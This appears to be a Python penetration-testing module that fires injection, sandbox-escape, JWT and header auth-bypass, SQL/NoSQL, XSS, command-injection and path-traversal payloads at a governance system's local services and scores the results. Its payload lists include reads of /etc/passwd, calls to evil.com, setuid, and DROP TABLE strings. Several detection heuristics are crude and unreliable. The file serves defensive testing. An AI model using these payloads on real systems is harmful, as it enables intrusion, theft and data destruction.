#!/usr/bin/env python3
"""
ACGS-1 Security Penetration Testing Framework

This module implements comprehensive security penetration testing for the ACGS-1
Constitutional Governance System, focusing on NeMo-Skills code execution sandbox
security and governance workflow vulnerabilities.

Security Testing Targets:
- NeMo-Skills code execution sandbox security
- Constitutional governance workflow security
- API endpoint security and authorization
- Blockchain transaction security
- Multi-model LLM security validation
- Cross-service security integration

Features:
- Automated vulnerability scanning
- Code injection testing for NeMo-Skills sandbox
- Authorization bypass testing
- Input validation and sanitization testing
- Blockchain security testing
- Real-time security monitoring
"""

import asyncio
import json
import logging
import random
import re
import subprocess
import time
import uuid
from dataclasses import dataclass, field
from datetime import datetime, timezone
from pathlib import Path
from typing import Any, Dict, List, Optional, Tuple

import aiohttp
import pytest
from prometheus_client import Counter, Gauge

# Configure logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# Prometheus metrics for security testing
security_tests_total = Counter(
    'acgs_security_tests_total',
    'Total security tests executed',
    ['test_type', 'severity', 'status']
)

vulnerabilities_found = Gauge(
    'acgs_vulnerabilities_found',
    'Number of vulnerabilities found',
    ['severity', 'component']
)

security_score_gauge = Gauge(
    'acgs_security_score',
    'Overall security score (0-100)'
)


@dataclass
class SecurityVulnerability:
    """Represents a security vulnerability found during testing."""
    id: str
    severity: str  # CRITICAL, HIGH, MEDIUM, LOW
    component: str
    vulnerability_type: str
    description: str
    proof_of_concept: str
    remediation: str
    cvss_score: float
    discovered_at: datetime = field(default_factory=lambda: datetime.now(timezone.utc))


@dataclass
class SecurityTestResult:
    """Results from security testing."""
    test_id: str
    test_type: str
    component: str
    success: bool
    vulnerabilities: List[SecurityVulnerability]
    execution_time_ms: float
    timestamp: datetime = field(default_factory=lambda: datetime.now(timezone.utc))


class NeMoSkillsSandboxSecurityTester:
    """Security tester for NeMo-Skills code execution sandbox."""
    
    def __init__(self, sandbox_url: str = "http://localhost:8080"):
        self.sandbox_url = sandbox_url
        self.session = None
    
    async def __aenter__(self):
        self.session = aiohttp.ClientSession()
        return self
    
    async def __aexit__(self, exc_type, exc_val, exc_tb):
        if self.session:
            await self.session.close()
    
    async def test_code_injection_vulnerabilities(self) -> SecurityTestResult:
        """Test for code injection vulnerabilities in NeMo-Skills sandbox."""
        start_time = time.time()
        test_id = str(uuid.uuid4())
        vulnerabilities = []
        
        # Code injection payloads
        injection_payloads = [
            # File system access attempts
            "import os; os.system('ls -la')",
            "import subprocess; subprocess.run(['cat', '/etc/passwd'])",
            "__import__('os').system('whoami')",
            
            # Network access attempts
            "import urllib.request; urllib.request.urlopen('http://evil.com')",
            "import socket; socket.create_connection(('evil.com', 80))",
            
            # Process manipulation
            "import os; os.fork()",
            "import threading; threading.Thread(target=lambda: exec('while True: pass')).start()",
            
            # Memory exhaustion
            "x = 'A' * (10**9)",
            "[i for i in range(10**8)]",
            
            # Privilege escalation attempts
            "import ctypes; ctypes.CDLL('libc.so.6').setuid(0)",
            "exec(open('/proc/self/environ').read())",
            
            # Python internals manipulation
            "__builtins__.__dict__.clear()",
            "exec.__globals__['__builtins__']['eval'] = lambda x: x",
        ]
        
        for i, payload in enumerate(injection_payloads):
            try:
                # Test payload execution
                test_data = {
                    "code": payload,
                    "language": "python",
                    "timeout": 5.0
                }
                
                async with self.session.post(
                    f"{self.sandbox_url}/execute",
                    json=test_data,
                    timeout=aiohttp.ClientTimeout(total=10)
                ) as response:
                    result = await response.json()
                    
                    # Check if dangerous operations succeeded
                    if self._is_dangerous_execution(result, payload):
                        vulnerability = SecurityVulnerability(
                            id=f"nemo_injection_{i:03d}",
                            severity="CRITICAL",
                            component="nemo_skills_sandbox",
                            vulnerability_type="code_injection",
                            description=f"Code injection vulnerability allows execution of: {payload}",
                            proof_of_concept=f"Payload: {payload}\nResult: {result}",
                            remediation="Implement stricter code execution sandboxing and input validation",
                            cvss_score=9.8
                        )
                        vulnerabilities.append(vulnerability)
                        
                        # Record vulnerability
                        vulnerabilities_found.labels(
                            severity="CRITICAL",
                            component="nemo_skills_sandbox"
                        ).inc()
                        
            except Exception as e:
                # Timeouts and errors are expected for dangerous code
                logger.debug(f"Expected security exception for payload {i}: {e}")
        
        execution_time = (time.time() - start_time) * 1000
        
        # Record test metrics
        security_tests_total.labels(
            test_type="code_injection",
            severity="CRITICAL" if vulnerabilities else "NONE",
            status="completed"
        ).inc()
        
        return SecurityTestResult(
            test_id=test_id,
            test_type="nemo_skills_code_injection",
            component="nemo_skills_sandbox",
            success=len(vulnerabilities) == 0,  # Success means no vulnerabilities found
            vulnerabilities=vulnerabilities,
            execution_time_ms=execution_time
        )
    
    def _is_dangerous_execution(self, result: Dict[str, Any], payload: str) -> bool:
        """Check if code execution result indicates a security vulnerability."""
        if not result:
            return False
        
        # Check for successful execution of dangerous operations
        stdout = result.get("stdout", "")
        stderr = result.get("stderr", "")
        process_status = result.get("process_status", "")
        
        # File system access indicators
        if any(indicator in stdout.lower() for indicator in [
            "root:", "passwd", "shadow", "/etc/", "/proc/", "total "
        ]):
            return True
        
        # Network access indicators
        if any(indicator in stdout.lower() for indicator in [
            "connected", "http", "socket", "network"
        ]):
            return True
        
        # Process manipulation success
        if "fork" in payload and "error" not in stderr.lower():
            return True
        
        # Memory allocation success (should be limited)
        if len(payload) > 100 and "memory" not in stderr.lower():
            return True
        
        return False
    
    async def test_sandbox_escape_attempts(self) -> SecurityTestResult:
        """Test for sandbox escape vulnerabilities."""
        start_time = time.time()
        test_id = str(uuid.uuid4())
        vulnerabilities = []
        
        # Sandbox escape payloads
        escape_payloads = [
            # Python import manipulation
            "import sys; sys.modules['os'] = __import__('os')",
            "globals()['__builtins__']['__import__'] = __import__",
            
            # Bytecode manipulation
            "compile('import os', '<string>', 'exec')",
            "eval(compile('__import__(\"os\")', '<string>', 'eval'))",
            
            # Exception handling escape
            "try: 1/0\nexcept: import os",
            
            # Class manipulation
            "class Evil: pass\nEvil.__bases__ = (type,)",
            
            # Metaclass manipulation
            "type('Evil', (), {'__new__': lambda cls: __import__('os')})",
        ]
        
        for i, payload in enumerate(escape_payloads):
            try:
                test_data = {
                    "code": payload,
                    "language": "python",
                    "timeout": 5.0
                }
                
                async with self.session.post(
                    f"{self.sandbox_url}/execute",
                    json=test_data,
                    timeout=aiohttp.ClientTimeout(total=10)
                ) as response:
                    result = await response.json()
                    
                    if self._is_sandbox_escape(result, payload):
                        vulnerability = SecurityVulnerability(
                            id=f"nemo_escape_{i:03d}",
                            severity="HIGH",
                            component="nemo_skills_sandbox",
                            vulnerability_type="sandbox_escape",
                            description=f"Sandbox escape vulnerability: {payload}",
                            proof_of_concept=f"Payload: {payload}\nResult: {result}",
                            remediation="Strengthen sandbox isolation and restrict Python internals access",
                            cvss_score=8.5
                        )
                        vulnerabilities.append(vulnerability)
                        
                        vulnerabilities_found.labels(
                            severity="HIGH",
                            component="nemo_skills_sandbox"
                        ).inc()
                        
            except Exception as e:
                logger.debug(f"Expected security exception for escape payload {i}: {e}")
        
        execution_time = (time.time() - start_time) * 1000
        
        security_tests_total.labels(
            test_type="sandbox_escape",
            severity="HIGH" if vulnerabilities else "NONE",
            status="completed"
        ).inc()
        
        return SecurityTestResult(
            test_id=test_id,
            test_type="nemo_skills_sandbox_escape",
            component="nemo_skills_sandbox",
            success=len(vulnerabilities) == 0,
            vulnerabilities=vulnerabilities,
            execution_time_ms=execution_time
        )
    
    def _is_sandbox_escape(self, result: Dict[str, Any], payload: str) -> bool:
        """Check if execution result indicates sandbox escape."""
        if not result:
            return False
        
        stdout = result.get("stdout", "")
        stderr = result.get("stderr", "")
        
        # Check for successful import of restricted modules
        if "import" in payload and "error" not in stderr.lower() and "traceback" not in stderr.lower():
            return True
        
        # Check for successful manipulation of Python internals
        if any(keyword in payload for keyword in ["__builtins__", "sys.modules", "globals()"]):
            if "error" not in stderr.lower():
                return True
        
        return False


class GovernanceWorkflowSecurityTester:
    """Security tester for governance workflows."""
    
    def __init__(self, base_url: str = "http://localhost"):
        self.base_url = base_url
        self.session = None
        self.service_ports = {
            "auth": 8000, "ac": 8001, "integrity": 8002,
            "fv": 8003, "gs": 8004, "pgc": 8005, "ec": 8006
        }
    
    async def __aenter__(self):
        self.session = aiohttp.ClientSession()
        return self
    
    async def __aexit__(self, exc_type, exc_val, exc_tb):
        if self.session:
            await self.session.close()
    
    async def test_authorization_bypass(self) -> SecurityTestResult:
        """Test for authorization bypass vulnerabilities."""
        start_time = time.time()
        test_id = str(uuid.uuid4())
        vulnerabilities = []
        
        # Authorization bypass techniques
        bypass_techniques = [
            # JWT manipulation
            {"Authorization": "Bearer invalid_token"},
            {"Authorization": "Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJ1c2VyIjoiYWRtaW4ifQ."},
            {"Authorization": "Bearer null"},
            
            # Header manipulation
            {"X-User-ID": "admin"},
            {"X-Admin": "true"},
            {"X-Bypass-Auth": "true"},
            
            # Parameter pollution
            {"user_id": ["user123", "admin"]},
            {"role": ["user", "admin"]},
        ]
        
        protected_endpoints = [
            ("/api/constitutional-ai/admin", 8001),
            ("/api/governance-synthesis/admin", 8004),
            ("/api/policy-governance/admin", 8005),
            ("/api/formal-verification/admin", 8003),
        ]
        
        for endpoint, port in protected_endpoints:
            for i, headers in enumerate(bypass_techniques):
                try:
                    url = f"{self.base_url}:{port}{endpoint}"
                    
                    async with self.session.get(url, headers=headers) as response:
                        # Check if unauthorized access was granted
                        if response.status == 200:
                            vulnerability = SecurityVulnerability(
                                id=f"auth_bypass_{port}_{i:03d}",
                                severity="HIGH",
                                component=f"service_port_{port}",
                                vulnerability_type="authorization_bypass",
                                description=f"Authorization bypass on {endpoint} using headers: {headers}",
                                proof_of_concept=f"URL: {url}\nHeaders: {headers}\nStatus: {response.status}",
                                remediation="Implement proper JWT validation and authorization checks",
                                cvss_score=8.1
                            )
                            vulnerabilities.append(vulnerability)
                            
                            vulnerabilities_found.labels(
                                severity="HIGH",
                                component=f"service_port_{port}"
                            ).inc()
                            
                except Exception as e:
                    logger.debug(f"Expected auth error for {endpoint}: {e}")
        
        execution_time = (time.time() - start_time) * 1000
        
        security_tests_total.labels(
            test_type="authorization_bypass",
            severity="HIGH" if vulnerabilities else "NONE",
            status="completed"
        ).inc()
        
        return SecurityTestResult(
            test_id=test_id,
            test_type="governance_authorization_bypass",
            component="governance_workflows",
            success=len(vulnerabilities) == 0,
            vulnerabilities=vulnerabilities,
            execution_time_ms=execution_time
        )
    
    async def test_input_validation_vulnerabilities(self) -> SecurityTestResult:
        """Test for input validation vulnerabilities."""
        start_time = time.time()
        test_id = str(uuid.uuid4())
        vulnerabilities = []
        
        # Malicious input payloads
        malicious_inputs = [
            # SQL injection attempts
            "'; DROP TABLE policies; --",
            "' OR '1'='1",
            "UNION SELECT * FROM users",
            
            # NoSQL injection
            '{"$ne": null}',
            '{"$where": "this.password.length > 0"}',
            
            # XSS payloads
            "<script>alert('XSS')</script>",
            "javascript:alert('XSS')",
            "<img src=x onerror=alert('XSS')>",
            
            # Command injection
            "; cat /etc/passwd",
            "| whoami",
            "&& ls -la",
            
            # Path traversal
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            
            # JSON injection
            '{"admin": true}',
            '"},"admin":true,"x":"',
            
            # Large payloads (DoS)
            "A" * 10000,
            "A" * 100000,
        ]
        
        test_endpoints = [
            ("/api/governance-synthesis/synthesize", 8004, "POST"),
            ("/api/constitutional-ai/validate", 8001, "POST"),
            ("/api/policy-governance/enforce", 8005, "POST"),
        ]
        
        for endpoint, port, method in test_endpoints:
            for i, payload in enumerate(malicious_inputs):
                try:
                    url = f"{self.base_url}:{port}{endpoint}"
                    test_data = {
                        "input": payload,
                        "content": payload,
                        "policy_text": payload,
                        "user_input": payload
                    }
                    
                    if method == "POST":
                        async with self.session.post(url, json=test_data) as response:
                            response_text = await response.text()
                            
                            # Check for signs of successful injection
                            if self._is_injection_successful(response_text, payload, response.status):
                                vulnerability = SecurityVulnerability(
                                    id=f"input_validation_{port}_{i:03d}",
                                    severity="MEDIUM",
                                    component=f"service_port_{port}",
                                    vulnerability_type="input_validation",
                                    description=f"Input validation bypass on {endpoint} with payload: {payload[:100]}",
                                    proof_of_concept=f"URL: {url}\nPayload: {payload}\nResponse: {response_text[:500]}",
                                    remediation="Implement comprehensive input validation and sanitization",
                                    cvss_score=6.5
                                )
                                vulnerabilities.append(vulnerability)
                                
                                vulnerabilities_found.labels(
                                    severity="MEDIUM",
                                    component=f"service_port_{port}"
                                ).inc()
                                
                except Exception as e:
                    logger.debug(f"Expected validation error for {endpoint}: {e}")
        
        execution_time = (time.time() - start_time) * 1000
        
        security_tests_total.labels(
            test_type="input_validation",
            severity="MEDIUM" if vulnerabilities else "NONE",
            status="completed"
        ).inc()
        
        return SecurityTestResult(
            test_id=test_id,
            test_type="governance_input_validation",
            component="governance_workflows",
            success=len(vulnerabilities) == 0,
            vulnerabilities=vulnerabilities,
            execution_time_ms=execution_time
        )
    
    def _is_injection_successful(self, response_text: str, payload: str, status_code: int) -> bool:
        """Check if injection payload was successful."""
        # Check for SQL error messages
        sql_errors = ["sql", "mysql", "postgresql", "sqlite", "syntax error"]
        if any(error in response_text.lower() for error in sql_errors):
            return True
        
        # Check for XSS reflection
        if "<script>" in payload and payload in response_text:
            return True
        
        # Check for command execution indicators
        if any(cmd in payload for cmd in [";", "|", "&&"]) and status_code == 500:
            return True
        
        # Check for path traversal success
        if "../" in payload and ("root:" in response_text or "passwd" in response_text):
            return True
        
        return False


class ComprehensiveSecurityTester:
    """Comprehensive security testing orchestrator."""
    
    def __init__(self):
        self.all_vulnerabilities: List[SecurityVulnerability] = []
        self.test_results: List[SecurityTestResult] = []
    
    async def run_comprehensive_security_test(self) -> Dict[str, Any]:
        """Run comprehensive security testing across all components."""
        logger.info("Starting comprehensive security penetration testing")
        start_time = time.time()
        
        # Test NeMo-Skills sandbox security
        async with NeMoSkillsSandboxSecurityTester() as nemo_tester:
            nemo_injection_result = await nemo_tester.test_code_injection_vulnerabilities()
            nemo_escape_result = await nemo_tester.test_sandbox_escape_attempts()
            
            self.test_results.extend([nemo_injection_result, nemo_escape_result])
            self.all_vulnerabilities.extend(nemo_injection_result.vulnerabilities)
            self.all_vulnerabilities.extend(nemo_escape_result.vulnerabilities)
        
        # Test governance workflow security
        async with GovernanceWorkflowSecurityTester() as workflow_tester:
            auth_bypass_result = await workflow_tester.test_authorization_bypass()
            input_validation_result = await workflow_tester.test_input_validation_vulnerabilities()
            
            self.test_results.extend([auth_bypass_result, input_validation_result])
            self.all_vulnerabilities.extend(auth_bypass_result.vulnerabilities)
            self.all_vulnerabilities.extend(input_validation_result.vulnerabilities)
        
        total_duration = time.time() - start_time
        
        # Calculate security metrics
        return self._calculate_security_metrics(total_duration)
    
    def _calculate_security_metrics(self, duration: float) -> Dict[str, Any]:
        """Calculate comprehensive security metrics."""
        # Vulnerability severity counts
        severity_counts = {
            "CRITICAL": len([v for v in self.all_vulnerabilities if v.severity == "CRITICAL"]),
            "HIGH": len([v for v in self.all_vulnerabilities if v.severity == "HIGH"]),
            "MEDIUM": len([v for v in self.all_vulnerabilities if v.severity == "MEDIUM"]),
            "LOW": len([v for v in self.all_vulnerabilities if v.severity == "LOW"])
        }
        
        total_vulnerabilities = sum(severity_counts.values())
        
        # Calculate security score (0-100)
        # Deduct points based on vulnerability severity
        security_score = 100.0
        security_score -= severity_counts["CRITICAL"] * 25  # -25 points per critical
        security_score -= severity_counts["HIGH"] * 15     # -15 points per high
        security_score -= severity_counts["MEDIUM"] * 8    # -8 points per medium
        security_score -= severity_counts["LOW"] * 3       # -3 points per low
        security_score = max(0, security_score)  # Don't go below 0
        
        # Update Prometheus metrics
        security_score_gauge.set(security_score)
        
        # Component analysis
        component_vulnerabilities = {}
        for vuln in self.all_vulnerabilities:
            if vuln.component not in component_vulnerabilities:
                component_vulnerabilities[vuln.component] = []
            component_vulnerabilities[vuln.component].append(vuln)
        
        # Security assessment
        security_assessment = {
            "zero_critical_vulnerabilities": severity_counts["CRITICAL"] == 0,
            "acceptable_risk_level": security_score >= 80,
            "production_ready": security_score >= 90 and severity_counts["CRITICAL"] == 0,
            "overall_security_status": "PASS" if security_score >= 80 and severity_counts["CRITICAL"] == 0 else "FAIL"
        }
        
        results = {
            "timestamp": datetime.now(timezone.utc).isoformat(),
            "test_duration_seconds": duration,
            "total_tests_executed": len(self.test_results),
            "total_vulnerabilities_found": total_vulnerabilities,
            "security_score": security_score,
            "vulnerability_summary": severity_counts,
            "component_analysis": {
                component: {
                    "vulnerability_count": len(vulns),
                    "highest_severity": max([v.severity for v in vulns], default="NONE"),
                    "average_cvss": sum([v.cvss_score for v in vulns]) / len(vulns) if vulns else 0
                }
                for component, vulns in component_vulnerabilities.items()
            },
            "security_assessment": security_assessment,
            "detailed_vulnerabilities": [
                {
                    "id": v.id,
                    "severity": v.severity,
                    "component": v.component,
                    "type": v.vulnerability_type,
                    "description": v.description,
                    "cvss_score": v.cvss_score,
                    "remediation": v.remediation
                }
                for v in self.all_vulnerabilities
            ]
        }
        
        logger.info(f"Security Test Results:")
        logger.info(f"  Security Score: {security_score:.1f}/100")
        logger.info(f"  Total Vulnerabilities: {total_vulnerabilities}")
        logger.info(f"  Critical: {severity_counts['CRITICAL']}, High: {severity_counts['HIGH']}")
        logger.info(f"  Overall Status: {security_assessment['overall_security_status']}")
        
        return results
    
    def save_results(self, filepath: str, metrics: Dict[str, Any]):
        """Save security test results to file."""
        Path(filepath).parent.mkdir(parents=True, exist_ok=True)
        with open(filepath, 'w') as f:
            json.dump(metrics, f, indent=2)
        logger.info(f"Security test results saved to {filepath}")


# Test functions for pytest integration
@pytest.mark.asyncio
async def test_comprehensive_security_testing():
    """Test comprehensive security testing framework."""
    tester = ComprehensiveSecurityTester()
    results = await tester.run_comprehensive_security_test()
    
    # Assertions for security targets
    assert results["security_assessment"]["zero_critical_vulnerabilities"], f"Found {results['vulnerability_summary']['CRITICAL']} critical vulnerabilities"
    assert results["security_assessment"]["acceptable_risk_level"], f"Security score {results['security_score']:.1f} below 80 threshold"
    assert results["security_score"] >= 80, f"Security score {results['security_score']:.1f} below minimum threshold"
    
    # Save test results
    tester.save_results("reports/comprehensive_security_test.json", results)


if __name__ == "__main__":
    async def main():
        tester = ComprehensiveSecurityTester()
        results = await tester.run_comprehensive_security_test()
        tester.save_results("reports/comprehensive_security_penetration_test.json", results)
        
        print("\n" + "="*80)
        print("COMPREHENSIVE SECURITY PENETRATION TEST COMPLETE")
        print("="*80)
        print(f"Security Score: {results['security_score']:.1f}/100")
        print(f"Overall Status: {results['security_assessment']['overall_security_status']}")
        print(f"Critical Vulnerabilities: {results['vulnerability_summary']['CRITICAL']}")
        print(f"Production Ready: {results['security_assessment']['production_ready']}")
    
    asyncio.run(main())
